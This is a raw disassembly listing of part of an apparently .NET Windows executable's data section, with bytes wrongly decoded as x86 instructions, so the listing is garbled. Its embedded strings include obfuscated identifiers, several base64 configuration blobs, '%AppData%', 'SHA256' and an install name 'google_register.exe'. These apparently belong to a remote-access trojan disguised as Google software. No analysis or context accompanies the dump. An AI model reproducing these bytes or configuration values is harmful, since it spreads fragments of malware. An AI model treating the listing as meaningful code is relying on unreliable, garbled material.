  409eb0:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409eb7:	74 
  409eb8:	65 6d                	gs insl (%dx),%es:(%edi)
  409eba:	2e 4e                	cs dec %esi
  409ebc:	65 74 2e             	gs je  0x409eed
  409ebf:	53                   	push   %ebx
  409ec0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409ec4:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409ecb:	64 
  409ecc:	6f                   	outsl  %ds:(%esi),(%dx)
  409ecd:	77 73                	ja     0x409f42
  409ecf:	49                   	dec    %ecx
  409ed0:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409ed3:	74 69                	je     0x409f3e
  409ed5:	74 79                	je     0x409f50
  409ed7:	00 49 73             	add    %cl,0x73(%ecx)
  409eda:	4e                   	dec    %esi
  409edb:	75 6c                	jne    0x409f49
  409edd:	6c                   	insb   (%dx),%es:(%edi)
  409ede:	4f                   	dec    %edi
  409edf:	72 45                	jb     0x409f26
  409ee1:	6d                   	insl   (%dx),%es:(%edi)
  409ee2:	70 74                	jo     0x409f58
  409ee4:	79 00                	jns    0x409ee6
  409ee6:	77 6f                	ja     0x409f57
  409ee8:	4f                   	dec    %edi
  409ee9:	6b 4e 6b 74          	imul   $0x74,0x6b(%esi),%ecx
  409eed:	68 51 51 7a 00       	push   $0x7a5151
  409ef2:	52                   	push   %edx
  409ef3:	78 6f                	js     0x409f64
  409ef5:	71 58                	jno    0x409f4f
  409ef7:	61                   	popa
  409ef8:	57                   	push   %edi
  409ef9:	5a                   	pop    %edx
  409efa:	51                   	push   %ecx
  409efb:	7a 00                	jp     0x409efd
  409efd:	4a                   	dec    %edx
  409efe:	54                   	push   %esp
  409eff:	4d                   	dec    %ebp
  409f00:	65 54                	gs push %esp
  409f02:	73 41                	jae    0x409f45
  409f04:	47                   	inc    %edi
  409f05:	68 72 58 7a 00       	push   $0x7a5872
  409f0a:	00 00                	add    %al,(%eax)
  409f0c:	00 0d 53 00 48 00    	add    %cl,0x480053
  409f12:	41                   	inc    %ecx
  409f13:	00 32                	add    %dh,(%edx)
  409f15:	00 35 00 36 00 00    	add    %dh,0x3600
  409f1b:	81 59 2b 00 30 00 63 	sbbl   $0x63003000,0x2b(%ecx)
  409f22:	00 42 00             	add    %al,0x0(%edx)
  409f25:	4b                   	dec    %ebx
  409f26:	00 38                	add    %bh,(%eax)
  409f28:	00 57 00             	add    %dl,0x0(%edi)
  409f2b:	58                   	pop    %eax
  409f2c:	00 62 00             	add    %ah,0x0(%edx)
  409f2f:	73 00                	jae    0x409f31
  409f31:	7a 00                	jp     0x409f33
  409f33:	6d                   	insl   (%dx),%es:(%edi)
  409f34:	00 76 00             	add    %dh,0x0(%esi)
  409f37:	47                   	inc    %edi
  409f38:	00 35 00 39 00 46    	add    %dh,0x46003900
  409f3e:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f41:	30 00                	xor    %al,(%eax)
  409f43:	48                   	dec    %eax
  409f44:	00 4a 00             	add    %cl,0x0(%edx)
  409f47:	6c                   	insb   (%dx),%es:(%edi)
  409f48:	00 7a 00             	add    %bh,0x0(%edx)
  409f4b:	56                   	push   %esi
  409f4c:	00 7a 00             	add    %bh,0x0(%edx)
  409f4f:	73 00                	jae    0x409f51
  409f51:	55                   	push   %ebp
  409f52:	00 2b                	add    %ch,(%ebx)
  409f54:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  409f58:	00 36                	add    %dh,(%esi)
  409f5a:	00 61 00             	add    %ah,0x0(%ecx)
  409f5d:	44                   	inc    %esp
  409f5e:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  409f62:	00 78 00             	add    %bh,0x0(%eax)
  409f65:	52                   	push   %edx
  409f66:	00 72 00             	add    %dh,0x0(%edx)
  409f69:	32 00                	xor    (%eax),%al
  409f6b:	7a 00                	jp     0x409f6d
  409f6d:	46                   	inc    %esi
  409f6e:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  409f72:	00 62 00             	add    %ah,0x0(%edx)
  409f75:	6c                   	insb   (%dx),%es:(%edi)
  409f76:	00 47 00             	add    %al,0x0(%edi)
  409f79:	61                   	popa
  409f7a:	00 61 00             	add    %ah,0x0(%ecx)
  409f7d:	61                   	popa
  409f7e:	00 78 00             	add    %bh,0x0(%eax)
  409f81:	38 00                	cmp    %al,(%eax)
  409f83:	57                   	push   %edi
  409f84:	00 51 00             	add    %dl,0x0(%ecx)
  409f87:	71 00                	jno    0x409f89
  409f89:	6c                   	insb   (%dx),%es:(%edi)
  409f8a:	00 72 00             	add    %dh,0x0(%edx)
  409f8d:	7a 00                	jp     0x409f8f
  409f8f:	6d                   	insl   (%dx),%es:(%edi)
  409f90:	00 4f 00             	add    %cl,0x0(%edi)
  409f93:	50                   	push   %eax
  409f94:	00 70 00             	add    %dh,0x0(%eax)
  409f97:	33 00                	xor    (%eax),%eax
  409f99:	63 00                	arpl   %eax,(%eax)
  409f9b:	46                   	inc    %esi
  409f9c:	00 50 00             	add    %dl,0x0(%eax)
  409f9f:	4b                   	dec    %ebx
  409fa0:	00 59 00             	add    %bl,0x0(%ecx)
  409fa3:	54                   	push   %esp
  409fa4:	00 62 00             	add    %ah,0x0(%edx)
  409fa7:	49                   	dec    %ecx
  409fa8:	00 62 00             	add    %ah,0x0(%edx)
  409fab:	6d                   	insl   (%dx),%es:(%edi)
  409fac:	00 73 00             	add    %dh,0x0(%ebx)
  409faf:	79 00                	jns    0x409fb1
  409fb1:	4f                   	dec    %edi
  409fb2:	00 62 00             	add    %ah,0x0(%edx)
  409fb5:	75 00                	jne    0x409fb7
  409fb7:	5a                   	pop    %edx
  409fb8:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  409fbc:	00 79 00             	add    %bh,0x0(%ecx)
  409fbf:	71 00                	jno    0x409fc1
  409fc1:	36 00 36             	add    %dh,%ss:(%esi)
  409fc4:	00 30                	add    %dh,(%eax)
  409fc6:	00 67 00             	add    %ah,0x0(%edi)
  409fc9:	6c                   	insb   (%dx),%es:(%edi)
  409fca:	00 34 00             	add    %dh,(%eax,%eax,1)
  409fcd:	54                   	push   %esp
  409fce:	00 39                	add    %bh,(%ecx)
  409fd0:	00 37                	add    %dh,(%edi)
  409fd2:	00 79 00             	add    %bh,0x0(%ecx)
  409fd5:	57                   	push   %edi
  409fd6:	00 4b 00             	add    %cl,0x0(%ebx)
  409fd9:	62 00                	bound  %eax,(%eax)
  409fdb:	4b                   	dec    %ebx
  409fdc:	00 2f                	add    %ch,(%edi)
  409fde:	00 49 00             	add    %cl,0x0(%ecx)
  409fe1:	57                   	push   %edi
  409fe2:	00 59 00             	add    %bl,0x0(%ecx)
  409fe5:	61                   	popa
  409fe6:	00 55 00             	add    %dl,0x0(%ebp)
  409fe9:	68 00 4a 00 31       	push   $0x31004a00
  409fee:	00 2f                	add    %ch,(%edi)
  409ff0:	00 63 00             	add    %ah,0x0(%ebx)
  409ff3:	6d                   	insl   (%dx),%es:(%edi)
  409ff4:	00 51 00             	add    %dl,0x0(%ecx)
  409ff7:	77 00                	ja     0x409ff9
  409ff9:	4e                   	dec    %esi
  409ffa:	00 79 00             	add    %bh,0x0(%ecx)
  409ffd:	6b 00 48             	imul   $0x48,(%eax),%eax
  40a000:	00 38                	add    %bh,(%eax)
  40a002:	00 79 00             	add    %bh,0x0(%ecx)
  40a005:	46                   	inc    %esi
  40a006:	00 5a 00             	add    %bl,0x0(%edx)
  40a009:	33 00                	xor    (%eax),%eax
  40a00b:	47                   	inc    %edi
  40a00c:	00 37                	add    %dh,(%edi)
  40a00e:	00 51 00             	add    %dl,0x0(%ecx)
  40a011:	2f                   	das
  40a012:	00 37                	add    %dh,(%edi)
  40a014:	00 6e 00             	add    %ch,0x0(%esi)
  40a017:	41                   	inc    %ecx
  40a018:	00 61 00             	add    %ah,0x0(%ecx)
  40a01b:	58                   	pop    %eax
  40a01c:	00 7a 00             	add    %bh,0x0(%edx)
  40a01f:	58                   	pop    %eax
  40a020:	00 75 00             	add    %dh,0x0(%ebp)
  40a023:	4a                   	dec    %edx
  40a024:	00 53 00             	add    %dl,0x0(%ebx)
  40a027:	54                   	push   %esp
  40a028:	00 55 00             	add    %dl,0x0(%ebp)
  40a02b:	46                   	inc    %esi
  40a02c:	00 4b 00             	add    %cl,0x0(%ebx)
  40a02f:	31 00                	xor    %eax,(%eax)
  40a031:	70 00                	jo     0x40a033
  40a033:	6d                   	insl   (%dx),%es:(%edi)
  40a034:	00 79 00             	add    %bh,0x0(%ecx)
  40a037:	39 00                	cmp    %eax,(%eax)
  40a039:	76 00                	jbe    0x40a03b
  40a03b:	37                   	aaa
  40a03c:	00 6f 00             	add    %ch,0x0(%edi)
  40a03f:	73 00                	jae    0x40a041
  40a041:	59                   	pop    %ecx
  40a042:	00 4a 00             	add    %cl,0x0(%edx)
  40a045:	44                   	inc    %esp
  40a046:	00 76 00             	add    %dh,0x0(%esi)
  40a049:	4f                   	dec    %edi
  40a04a:	00 55 00             	add    %dl,0x0(%ebp)
  40a04d:	71 00                	jno    0x40a04f
  40a04f:	58                   	pop    %eax
  40a050:	00 66 00             	add    %ah,0x0(%esi)
  40a053:	54                   	push   %esp
  40a054:	00 58 00             	add    %bl,0x0(%eax)
  40a057:	37                   	aaa
  40a058:	00 4b 00             	add    %cl,0x0(%ebx)
  40a05b:	43                   	inc    %ebx
  40a05c:	00 46 00             	add    %al,0x0(%esi)
  40a05f:	45                   	inc    %ebp
  40a060:	00 53 00             	add    %dl,0x0(%ebx)
  40a063:	4d                   	dec    %ebp
  40a064:	00 59 00             	add    %bl,0x0(%ecx)
  40a067:	2b 00                	sub    (%eax),%eax
  40a069:	67 00 65 00          	add    %ah,0x0(%di)
  40a06d:	32 00                	xor    (%eax),%al
  40a06f:	43                   	inc    %ebx
  40a070:	00 6f 00             	add    %ch,0x0(%edi)
  40a073:	3d 00 00 81 01       	cmp    $0x1810000,%eax
  40a078:	4a                   	dec    %edx
  40a079:	00 52 00             	add    %dl,0x0(%edx)
  40a07c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a080:	47                   	inc    %edi
  40a081:	00 7a 00             	add    %bh,0x0(%edx)
  40a084:	52                   	push   %edx
  40a085:	00 68 00             	add    %ch,0x0(%eax)
  40a088:	2f                   	das
  40a089:	00 52 00             	add    %dl,0x0(%edx)
  40a08c:	39 00                	cmp    %eax,(%eax)
  40a08e:	2b 00                	sub    (%eax),%eax
  40a090:	70 00                	jo     0x40a092
  40a092:	57                   	push   %edi
  40a093:	00 31                	add    %dh,(%ecx)
  40a095:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40a099:	00 41 00             	add    %al,0x0(%ecx)
  40a09c:	4b                   	dec    %ebx
  40a09d:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40a0a1:	00 32                	add    %dh,(%edx)
  40a0a3:	00 72 00             	add    %dh,0x0(%edx)
  40a0a6:	78 00                	js     0x40a0a8
  40a0a8:	37                   	aaa
  40a0a9:	00 5a 00             	add    %bl,0x0(%edx)
  40a0ac:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40a0b0:	5a                   	pop    %edx
  40a0b1:	00 77 00             	add    %dh,0x0(%edi)
  40a0b4:	62 00                	bound  %eax,(%eax)
  40a0b6:	39 00                	cmp    %eax,(%eax)
  40a0b8:	6b 00 78             	imul   $0x78,(%eax),%eax
  40a0bb:	00 63 00             	add    %ah,0x0(%ebx)
  40a0be:	78 00                	js     0x40a0c0
  40a0c0:	43                   	inc    %ebx
  40a0c1:	00 33                	add    %dh,(%ebx)
  40a0c3:	00 66 00             	add    %ah,0x0(%esi)
  40a0c6:	41                   	inc    %ecx
  40a0c7:	00 6a 00             	add    %ch,0x0(%edx)
  40a0ca:	47                   	inc    %edi
  40a0cb:	00 55 00             	add    %dl,0x0(%ebp)
  40a0ce:	43                   	inc    %ebx
  40a0cf:	00 2f                	add    %ch,(%edi)
  40a0d1:	00 53 00             	add    %dl,0x0(%ebx)
  40a0d4:	4e                   	dec    %esi
  40a0d5:	00 37                	add    %dh,(%edi)
  40a0d7:	00 50 00             	add    %dl,0x0(%eax)
  40a0da:	2b 00                	sub    (%eax),%eax
  40a0dc:	6c                   	insb   (%dx),%es:(%edi)
  40a0dd:	00 42 00             	add    %al,0x0(%edx)
  40a0e0:	53                   	push   %ebx
  40a0e1:	00 73 00             	add    %dh,0x0(%ebx)
  40a0e4:	63 00                	arpl   %eax,(%eax)
  40a0e6:	4d                   	dec    %ebp
  40a0e7:	00 31                	add    %dh,(%ecx)
  40a0e9:	00 77 00             	add    %dh,0x0(%edi)
  40a0ec:	37                   	aaa
  40a0ed:	00 58 00             	add    %bl,0x0(%eax)
  40a0f0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0f1:	00 78 00             	add    %bh,0x0(%eax)
  40a0f4:	32 00                	xor    (%eax),%al
  40a0f6:	50                   	push   %eax
  40a0f7:	00 58 00             	add    %bl,0x0(%eax)
  40a0fa:	4f                   	dec    %edi
  40a0fb:	00 69 00             	add    %ch,0x0(%ecx)
  40a0fe:	4c                   	dec    %esp
  40a0ff:	00 4b 00             	add    %cl,0x0(%ebx)
  40a102:	5a                   	pop    %edx
  40a103:	00 77 00             	add    %dh,0x0(%edi)
  40a106:	4e                   	dec    %esi
  40a107:	00 6a 00             	add    %ch,0x0(%edx)
  40a10a:	76 00                	jbe    0x40a10c
  40a10c:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40a10f:	00 77 00             	add    %dh,0x0(%edi)
  40a112:	4e                   	dec    %esi
  40a113:	00 69 00             	add    %ch,0x0(%ecx)
  40a116:	53                   	push   %ebx
  40a117:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40a11b:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40a11f:	00 50 00             	add    %dl,0x0(%eax)
  40a122:	43                   	inc    %ebx
  40a123:	00 6f 00             	add    %ch,0x0(%edi)
  40a126:	77 00                	ja     0x40a128
  40a128:	62 00                	bound  %eax,(%eax)
  40a12a:	72 00                	jb     0x40a12c
  40a12c:	34 00                	xor    $0x0,%al
  40a12e:	74 00                	je     0x40a130
  40a130:	53                   	push   %ebx
  40a131:	00 6e 00             	add    %ch,0x0(%esi)
  40a134:	41                   	inc    %ecx
  40a135:	00 75 00             	add    %dh,0x0(%ebp)
  40a138:	4b                   	dec    %ebx
  40a139:	00 30                	add    %dh,(%eax)
  40a13b:	00 50 00             	add    %dl,0x0(%eax)
  40a13e:	5a                   	pop    %edx
  40a13f:	00 38                	add    %bh,(%eax)
  40a141:	00 4f 00             	add    %cl,0x0(%edi)
  40a144:	57                   	push   %edi
  40a145:	00 5a 00             	add    %bl,0x0(%edx)
  40a148:	68 00 61 00 68       	push   $0x68006100
  40a14d:	00 48 00             	add    %cl,0x0(%eax)
  40a150:	33 00                	xor    (%eax),%eax
  40a152:	30 00                	xor    %al,(%eax)
  40a154:	2f                   	das
  40a155:	00 35 00 42 00 72    	add    %dh,0x72004200
  40a15b:	00 6f 00             	add    %ch,0x0(%edi)
  40a15e:	2b 00                	sub    (%eax),%eax
  40a160:	71 00                	jno    0x40a162
  40a162:	68 00 54 00 39       	push   $0x39005400
  40a167:	00 67 00             	add    %ah,0x0(%edi)
  40a16a:	75 00                	jne    0x40a16c
  40a16c:	71 00                	jno    0x40a16e
  40a16e:	57                   	push   %edi
  40a16f:	00 62 00             	add    %ah,0x0(%edx)
  40a172:	39 00                	cmp    %eax,(%eax)
  40a174:	7a 00                	jp     0x40a176
  40a176:	37                   	aaa
  40a177:	00 00                	add    %al,(%eax)
  40a179:	80 b1 45 00 78 00 4c 	xorb   $0x4c,0x780045(%ecx)
  40a180:	00 78 00             	add    %bh,0x0(%eax)
  40a183:	71 00                	jno    0x40a185
  40a185:	47                   	inc    %edi
  40a186:	00 6f 00             	add    %ch,0x0(%edi)
  40a189:	4c                   	dec    %esp
  40a18a:	00 61 00             	add    %ah,0x0(%ecx)
  40a18d:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a191:	4c                   	dec    %esp
  40a192:	00 58 00             	add    %bl,0x0(%eax)
  40a195:	56                   	push   %esi
  40a196:	00 50 00             	add    %dl,0x0(%eax)
  40a199:	62 00                	bound  %eax,(%eax)
  40a19b:	6b 00 32             	imul   $0x32,(%eax),%eax
  40a19e:	00 4f 00             	add    %cl,0x0(%edi)
  40a1a1:	6d                   	insl   (%dx),%es:(%edi)
  40a1a2:	00 63 00             	add    %ah,0x0(%ebx)
  40a1a5:	54                   	push   %esp
  40a1a6:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40a1aa:	00 56 00             	add    %dl,0x0(%esi)
  40a1ad:	47                   	inc    %edi
  40a1ae:	00 68 00             	add    %ch,0x0(%eax)
  40a1b1:	53                   	push   %ebx
  40a1b2:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40a1b6:	00 7a 00             	add    %bh,0x0(%edx)
  40a1b9:	75 00                	jne    0x40a1bb
  40a1bb:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40a1bf:	76 00                	jbe    0x40a1c1
  40a1c1:	58                   	pop    %eax
  40a1c2:	00 75 00             	add    %dh,0x0(%ebp)
  40a1c5:	71 00                	jno    0x40a1c7
  40a1c7:	43                   	inc    %ebx
  40a1c8:	00 76 00             	add    %dh,0x0(%esi)
  40a1cb:	76 00                	jbe    0x40a1cd
  40a1cd:	42                   	inc    %edx
  40a1ce:	00 32                	add    %dh,(%edx)
  40a1d0:	00 79 00             	add    %bh,0x0(%ecx)
  40a1d3:	2b 00                	sub    (%eax),%eax
  40a1d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1d6:	00 4a 00             	add    %cl,0x0(%edx)
  40a1d9:	79 00                	jns    0x40a1db
  40a1db:	53                   	push   %ebx
  40a1dc:	00 30                	add    %dh,(%eax)
  40a1de:	00 38                	add    %bh,(%eax)
  40a1e0:	00 4f 00             	add    %cl,0x0(%edi)
  40a1e3:	49                   	dec    %ecx
  40a1e4:	00 61 00             	add    %ah,0x0(%ecx)
  40a1e7:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a1ea:	00 62 00             	add    %ah,0x0(%edx)
  40a1ed:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40a1f1:	4a                   	dec    %edx
  40a1f2:	00 45 00             	add    %al,0x0(%ebp)
  40a1f5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1f6:	00 6e 00             	add    %ch,0x0(%esi)
  40a1f9:	59                   	pop    %ecx
  40a1fa:	00 6e 00             	add    %ch,0x0(%esi)
  40a1fd:	31 00                	xor    %eax,(%eax)
  40a1ff:	4e                   	dec    %esi
  40a200:	00 78 00             	add    %bh,0x0(%eax)
  40a203:	4e                   	dec    %esi
  40a204:	00 68 00             	add    %ch,0x0(%eax)
  40a207:	75 00                	jne    0x40a209
  40a209:	69 00 79 00 59 00    	imul   $0x590079,(%eax),%eax
  40a20f:	48                   	dec    %eax
  40a210:	00 52 00             	add    %dl,0x0(%edx)
  40a213:	38 00                	cmp    %al,(%eax)
  40a215:	58                   	pop    %eax
  40a216:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40a21a:	00 53 00             	add    %dl,0x0(%ebx)
  40a21d:	6a 00                	push   $0x0
  40a21f:	43                   	inc    %ebx
  40a220:	00 56 00             	add    %dl,0x0(%esi)
  40a223:	6b 00 77             	imul   $0x77,(%eax),%eax
  40a226:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a22c:	80 b1 35 00 31 00 6e 	xorb   $0x6e,0x310035(%ecx)
  40a233:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a237:	00 4a 00             	add    %cl,0x0(%edx)
  40a23a:	68 00 43 00 74       	push   $0x74004300
  40a23f:	00 57 00             	add    %dl,0x0(%edi)
  40a242:	59                   	pop    %ecx
  40a243:	00 6a 00             	add    %ch,0x0(%edx)
  40a246:	33 00                	xor    (%eax),%eax
  40a248:	6f                   	outsl  %ds:(%esi),(%dx)
  40a249:	00 52 00             	add    %dl,0x0(%edx)
  40a24c:	56                   	push   %esi
  40a24d:	00 68 00             	add    %ch,0x0(%eax)
  40a250:	42                   	inc    %edx
  40a251:	00 5a 00             	add    %bl,0x0(%edx)
  40a254:	49                   	dec    %ecx
  40a255:	00 43 00             	add    %al,0x0(%ebx)
  40a258:	35 00 6c 00 6b       	xor    $0x6b006c00,%eax
  40a25d:	00 68 00             	add    %ch,0x0(%eax)
  40a260:	46                   	inc    %esi
  40a261:	00 68 00             	add    %ch,0x0(%eax)
  40a264:	71 00                	jno    0x40a266
  40a266:	56                   	push   %esi
  40a267:	00 62 00             	add    %ah,0x0(%edx)
  40a26a:	5a                   	pop    %edx
  40a26b:	00 4a 00             	add    %cl,0x0(%edx)
  40a26e:	50                   	push   %eax
  40a26f:	00 6f 00             	add    %ch,0x0(%edi)
  40a272:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40a276:	2f                   	das
  40a277:	00 75 00             	add    %dh,0x0(%ebp)
  40a27a:	35 00 38 00 36       	xor    $0x36003800,%eax
  40a27f:	00 5a 00             	add    %bl,0x0(%edx)
  40a282:	53                   	push   %ebx
  40a283:	00 70 00             	add    %dh,0x0(%eax)
  40a286:	74 00                	je     0x40a288
  40a288:	37                   	aaa
  40a289:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40a28d:	00 7a 00             	add    %bh,0x0(%edx)
  40a290:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40a294:	75 00                	jne    0x40a296
  40a296:	34 00                	xor    $0x0,%al
  40a298:	6e                   	outsb  %ds:(%esi),(%dx)
  40a299:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40a29d:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40a2a1:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40a2a5:	00 48 00             	add    %cl,0x0(%eax)
  40a2a8:	34 00                	xor    $0x0,%al
  40a2aa:	51                   	push   %ecx
  40a2ab:	00 6a 00             	add    %ch,0x0(%edx)
  40a2ae:	38 00                	cmp    %al,(%eax)
  40a2b0:	4d                   	dec    %ebp
  40a2b1:	00 35 00 74 00 31    	add    %dh,0x31007400
  40a2b7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2ba:	71 00                	jno    0x40a2bc
  40a2bc:	53                   	push   %ebx
  40a2bd:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40a2c1:	00 48 00             	add    %cl,0x0(%eax)
  40a2c4:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40a2c8:	77 00                	ja     0x40a2ca
  40a2ca:	50                   	push   %eax
  40a2cb:	00 46 00             	add    %al,0x0(%esi)
  40a2ce:	48                   	dec    %eax
  40a2cf:	00 6b 00             	add    %ch,0x0(%ebx)
  40a2d2:	76 00                	jbe    0x40a2d4
  40a2d4:	2b 00                	sub    (%eax),%eax
  40a2d6:	44                   	inc    %esp
  40a2d7:	00 41 00             	add    %al,0x0(%ecx)
  40a2da:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a2df:	13 25 00 41 00 70    	adc    0x70004100,%esp
  40a2e5:	00 70 00             	add    %dh,0x0(%eax)
  40a2e8:	44                   	inc    %esp
  40a2e9:	00 61 00             	add    %ah,0x0(%ecx)
  40a2ec:	74 00                	je     0x40a2ee
  40a2ee:	61                   	popa
  40a2ef:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2f5:	00 6f 00             	add    %ch,0x0(%edi)
  40a2f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2f9:	00 67 00             	add    %ah,0x0(%edi)
  40a2fc:	6c                   	insb   (%dx),%es:(%edi)
  40a2fd:	00 65 00             	add    %ah,0x0(%ebp)
  40a300:	5f                   	pop    %edi
  40a301:	00 72 00             	add    %dh,0x0(%edx)
  40a304:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a308:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a30e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a312:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a316:	78 00                	js     0x40a318
  40a318:	65 00 00             	add    %al,%gs:(%eax)
  40a31b:	59                   	pop    %ecx
  40a31c:	62 00                	bound  %eax,(%eax)
  40a31e:	33 00                	xor    (%eax),%eax
  40a320:	59                   	pop    %ecx
  40a321:	00 77 00             	add    %dh,0x0(%edi)
  40a324:	63 00                	arpl   %eax,(%eax)
  40a326:	30 00                	xor    %al,(%eax)
  40a328:	6c                   	insb   (%dx),%es:(%edi)
  40a329:	00 42 00             	add    %al,0x0(%edx)
  40a32c:	4f                   	dec    %edi
  40a32d:	00 58 00             	add    %bl,0x0(%eax)
  40a330:	6c                   	insb   (%dx),%es:(%edi)
  40a331:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40a335:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40a339:	00 5a 00             	add    %bl,0x0(%edx)
  40a33c:	54                   	push   %esp
  40a33d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a340:	4e                   	dec    %esi
  40a341:	00 7a 00             	add    %bh,0x0(%edx)
  40a344:	56                   	push   %esi
  40a345:	00 46 00             	add    %al,0x0(%esi)
  40a348:	4d                   	dec    %ebp
  40a349:	00 31                	add    %dh,(%ecx)
  40a34b:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40a34f:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40a353:	00 4d 00             	add    %cl,0x0(%ebp)
  40a356:	47                   	inc    %edi
  40a357:	00 4a 00             	add    %cl,0x0(%edx)
  40a35a:	56                   	push   %esi
  40a35b:	00 51 00             	add    %dl,0x0(%ecx)
  40a35e:	32 00                	xor    (%eax),%al
  40a360:	68 00 71 00 56       	push   $0x56007100
  40a365:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40a369:	00 35 00 52 00 45    	add    %dh,0x45005200
  40a36f:	00 6b 00             	add    %ch,0x0(%ebx)
  40a372:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40a377:	4e                   	dec    %esi
  40a378:	00 59 00             	add    %bl,0x0(%ecx)
  40a37b:	55                   	push   %ebp
  40a37c:	00 57 00             	add    %dl,0x0(%edi)
  40a37f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a383:	71 00                	jno    0x40a385
  40a385:	72 00                	jb     0x40a387
  40a387:	31 00                	xor    %eax,(%eax)
  40a389:	52                   	push   %edx
  40a38a:	00 2b                	add    %ch,(%ebx)
  40a38c:	00 6f 00             	add    %ch,0x0(%edi)
  40a38f:	74 00                	je     0x40a391
  40a391:	53                   	push   %ebx
  40a392:	00 4e 00             	add    %cl,0x0(%esi)
  40a395:	54                   	push   %esp
  40a396:	00 76 00             	add    %dh,0x0(%esi)
  40a399:	55                   	push   %ebp
  40a39a:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40a39e:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40a3a2:	00 70 00             	add    %dh,0x0(%eax)
  40a3a5:	31 00                	xor    %eax,(%eax)
  40a3a7:	4c                   	dec    %esp
  40a3a8:	00 68 00             	add    %ch,0x0(%eax)
  40a3ab:	44                   	inc    %esp
  40a3ac:	00 5a 00             	add    %bl,0x0(%edx)
  40a3af:	37                   	aaa
  40a3b0:	00 72 00             	add    %dh,0x0(%edx)
  40a3b3:	65 00 39             	add    %bh,%gs:(%ecx)
  40a3b6:	00 36                	add    %dh,(%esi)
  40a3b8:	00 45 00             	add    %al,0x0(%ebp)
  40a3bb:	77 00                	ja     0x40a3bd
  40a3bd:	54                   	push   %esp
  40a3be:	00 6f 00             	add    %ch,0x0(%edi)
  40a3c1:	48                   	dec    %eax
  40a3c2:	00 61 00             	add    %ah,0x0(%ecx)
  40a3c5:	2b 00                	sub    (%eax),%eax
  40a3c7:	2f                   	das
  40a3c8:	00 51 00             	add    %dl,0x0(%ecx)
  40a3cb:	35 00 66 00 69       	xor    $0x69006600,%eax
  40a3d0:	00 57 00             	add    %dl,0x0(%edi)
  40a3d3:	56                   	push   %esi
  40a3d4:	00 63 00             	add    %ah,0x0(%ebx)
  40a3d7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3d8:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40a3dc:	00 36                	add    %dh,(%esi)
  40a3de:	00 72 00             	add    %dh,0x0(%edx)
  40a3e1:	5a                   	pop    %edx
  40a3e2:	00 75 00             	add    %dh,0x0(%ebp)
  40a3e5:	6c                   	insb   (%dx),%es:(%edi)
  40a3e6:	00 42 00             	add    %al,0x0(%edx)
  40a3e9:	2b 00                	sub    (%eax),%eax
  40a3eb:	62 00                	bound  %eax,(%eax)
  40a3ed:	52                   	push   %edx
  40a3ee:	00 66 00             	add    %ah,0x0(%esi)
  40a3f1:	34 00                	xor    $0x0,%al
  40a3f3:	49                   	dec    %ecx
  40a3f4:	00 58 00             	add    %bl,0x0(%eax)
  40a3f7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3f8:	00 76 00             	add    %dh,0x0(%esi)
  40a3fb:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40a3fe:	00 69 00             	add    %ch,0x0(%ecx)
  40a401:	79 00                	jns    0x40a403
  40a403:	74 00                	je     0x40a405
  40a405:	6e                   	outsb  %ds:(%esi),(%dx)
  40a406:	00 6d 00             	add    %ch,0x0(%ebp)
  40a409:	67 00 67 00          	add    %ah,0x0(%bx)
